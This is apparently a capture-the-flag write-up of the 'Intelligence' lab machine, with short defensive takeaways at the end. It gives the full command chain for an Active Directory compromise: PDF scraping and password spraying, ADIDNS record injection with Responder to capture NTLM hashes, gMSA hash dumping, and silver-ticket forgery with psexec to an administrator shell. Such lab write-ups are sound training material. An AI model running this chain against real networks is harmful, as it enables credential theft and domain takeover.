# Intelligence (Medium)

PDF metadata harvesting leads to a password spray, then an ADIDNS record-injection + NTLM relay chain, and finally a gMSA secret dump used to forge a silver ticket.

## Enumeration

```bash
nmap -sC -sV <target>
```

```
53/tcp   open domain
80/tcp   open http          Microsoft IIS 10.0 — "Intelligence"
88/tcp   open kerberos-sec  (Domain: intelligence.htb)
135/tcp  open msrpc
139/tcp  open netbios-ssn
389/tcp  open ldap          (cert CN=dc.intelligence.htb)
445/tcp  open microsoft-ds?
464/tcp  open kpasswd5?
593/tcp  open ncacn_http
636/tcp  open ssl/ldap
3268/tcp open ldap
3269/tcp open ssl/ldap
```

## Foothold — Harvesting daily-uploaded PDFs

The site hosted daily PDF reports at predictable, date-based URLs. A wordlist of plausible filenames was generated and the documents bulk-downloaded:

```bash
for i in $(seq 0 365); do
  d=$(date --date="2020-01-01 + $i days" +%Y-%m-%d)
  echo "$d-upload.pdf" >> data.txt
done
for f in $(cat data.txt); do wget "http://<target>/documents/$f"; done
```

Document metadata (`exiftool`) revealed employee usernames as the PDF "Creator"; the extracted text (`pdftotext`) of one document contained a plaintext password (redacted — `<REDACTED>`):

```bash
exiftool *.pdf | grep Creator >> user
for f in *.pdf; do pdftotext "$f"; done
cat *.txt | grep password -B5 -A5
```

```bash
crackmapexec smb <target> -u users -p '<REDACTED>'
smbclient \\\\<target>\\IT
```
→ `user.txt` retrieved from a user's Desktop via SMB. A PowerShell script, `downdetector.ps1`, was also found — it periodically makes authenticated HTTP requests to any DNS host whose name starts with `web`.

## ADIDNS record injection → NTLM capture

Authenticated domain users can, by default, add new records to the Active Directory–Integrated DNS (ADIDNS) zone. This was abused to register a hostname matching the script's pattern and point it at the attacker:

```bash
python3 dnstool.py -u 'intelligence\<user>' -p '<REDACTED>' -r webippsec.intelligence.htb -a add -t A -d <attacker_ip> <target>
responder -I tun0 -dwPn
```

When the scheduled script ran, it requested the attacker-controlled hostname and leaked a NetNTLMv2 hash for a privileged account (redacted). Used with BloodHound (`bloodhound-python`) to find the next step: a **gMSA** (`svc_int$`) was identified as key to further progress.

## gMSA secret dump → silver ticket

```bash
python3 gMSADumper.py -u '<user>' -p '<REDACTED>' -d intelligence.htb
```
→ recovered the gMSA's NTLM hash (redacted). Verified with CrackMapExec, then forged a service ticket:

```bash
sudo ntpdate -u intelligence.htb
getST.py -dc-ip <target> -spn WWW/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$ -hashes <REDACTED>:<REDACTED>
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass administrator@dc.intelligence.htb
```

## Takeaways

- Predictable date-based upload URLs + PDF metadata/content are a realistic internal-recon source for usernames and passwords.
- Any authenticated user can usually register ADIDNS records by default — a scheduled task or script that resolves and calls back to a dynamic/user-controlled hostname is an NTLM-relay opportunity.
- gMSA (Group Managed Service Account) passwords are retrievable by anyone with read access to `msDS-ManagedPassword` — audit who can read that attribute.
